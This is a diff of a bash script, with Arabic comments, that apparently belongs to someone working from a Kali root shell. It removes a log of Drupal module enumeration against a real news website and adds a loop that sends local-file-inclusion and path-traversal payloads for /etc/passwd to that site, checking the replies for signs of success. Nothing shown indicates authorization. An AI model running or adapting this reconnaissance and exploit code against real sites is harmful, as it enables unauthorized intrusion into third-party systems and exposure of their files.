@@ -1,37 +1,58 @@
- ./sh.sh
-[*] بدء فحص الموديلات والإضافات النشطة على الهدف...
-[+] الموديل/المسار موجود (403): /modules/contrib/blazy
-[+] الموديل/المسار موجود (403): /modules/contrib/better_exposed_filters
-[+] الموديل/المسار موجود (403): /modules/contrib/jquery_ui
-[+] الموديل/المسار موجود (403): /modules/contrib/jquery_ui_datepicker
-[+] الموديل/المسار موجود (403): /modules/contrib/text_resize
-[+] الموديل/المسار موجود (403): /modules/contrib/extlink
-[+] الموديل/المسار موجود (403): /modules/contrib/lazy
-[+] الموديل/المسار موجود (403): /modules/custom/custom
-[+] الموديل/المسار موجود (403): /modules/custom/custom_push_notifications
-[+] الموديل/المسار موجود (403): /modules/custom/stv_tweaks
-[+] الموديل/المسار موجود (403): /themes/custom/syriatv
+#!/bin/bash
 
-[*] انتهى فحص الموديلات.
-                                                                                
-┌──(venv)─(root㉿kali)-[/home/ghost/dTa]
-└─# rm sh.sh      
-                                                                                
-┌──(venv)─(root㉿kali)-[/home/ghost/dTa]
-└─# nano sh.sh    
-                                                                                
-┌──(venv)─(root㉿kali)-[/home/ghost/dTa]
-└─# chmod +x sh.sh
-                                                                                
-┌──(venv)─(root㉿kali)-[/home/ghost/dTa]
-└─# ./sh.sh       
-[*] بدء محاولة استخراج إصدارات الموديلات عبر ملفات التعريف...
-[-] ملف التعريف محجوب أو غير موجود لـ (better_exposed_filters) - الحالة 403
-[-] ملف التعريف محجوب أو غير موجود لـ (extlink) - الحالة 403
-[-] ملف التعريف محجوب أو غير موجود لـ (lazy) - الحالة 403
-[-] ملف التعريف محجوب أو غير موجود لـ (blazy) - الحالة 403
+# ألوان لتنظيم المخرجات
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+BLUE='\033[0;34m'
+YELLOW='\033[0;33m'
+NC='\033[0m'
 
-[*] تم الانتهاء من محاولة جلب الإصدارات.
-                                                                                
-┌──(venv)─(root㉿kali)-[/home/ghost/dTa]
-└─# 
+TARGET="https://www.syria.tv"
+
+echo -e "${BLUE}[*] بدء محاكاة اختبار حقن وتخطي المسارات (LFI Test)...${NC}"
+
+# مصفوفة تحتوي على أنماط الحقن الشائعة لمحاولة قراءة ملفات النظام الأساسية
+PAYLOADS=(
+    "../../../../../../../../etc/passwd"
+    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    "../../../../../../../../etc/passwd%00"
+    "/etc/passwd"
+)
+
+# المعلمات أو المسارات التي قد تتفاعل مع الملفات (يتم اختبارها بشكل افتراضي)
+TEST_PATHS=(
+    "/search-custom?page="
+    "/?file="
+    "/?theme="
+)
+
+for PATH_BASE in "${TEST_PATHS[@]}"
+do
+    for PAYLOAD in "${PAYLOADS[@]}"
+    do
+        # دمج الرابط مع نمط الحقن
+        URL="${TARGET}${PATH_BASE}${PAYLOAD}"
+        
+        # إرسال الطلب وجلب كود الحالة وحجم الاستجابة
+        RESPONSE=$(curl -s -o /dev/null -w "%{http_code};%{size_download}" "$URL")
+        STATUS=$(echo $RESPONSE | cut -d';' -f1)
+        SIZE=$(echo $RESPONSE | cut -d';' -f2)
+        
+        # تحليل الاستجابة بناءً على السلوك
+        if [ "$STATUS" -eq 200 ]; then
+            # إذا كانت الحالة 200، نقوم بالتحقق من وجود علامات تدل على نجاح الحقن (مثل محتوى نظام Linux)
+            CHECK_CONTENT=$(curl -s "$URL" | grep -E "root:x:|bin/bash" | wc -l)
+            if [ "$CHECK_CONTENT" -gt 0 ]; then
+                echo -e "${RED}[!] تحذير: استجابة إيجابية محتملة (نجاح الحقن) على: $URL (الحجم: $SIZE)${NC}"
+            else
+                echo -e "${YELLOW}[-] الحالة 200 ولكن المحتوى طبيعي (لا يوجد حقن فعلي): ${PATH_BASE}${PAYLOAD}${NC}"
+            fi
+        elif [ "$STATUS" -eq 403 ] || [ "$STATUS" -eq 400 ]; then
+            echo -e "${GREEN}[+] الخادم قام بحظر المحاولة بشكل آمن ($STATUS): ${PATH_BASE}${PAYLOAD}${NC}"
+        else
+            echo -e "${BLUE}[-] استجابة عادية ($STATUS): ${PATH_BASE}${PAYLOAD}${NC}"
+        fi
+    done
+done
+
+echo -e "\n${BLUE}[*] انتهى اختبار محاكاة حقن الملفات.${NC}"
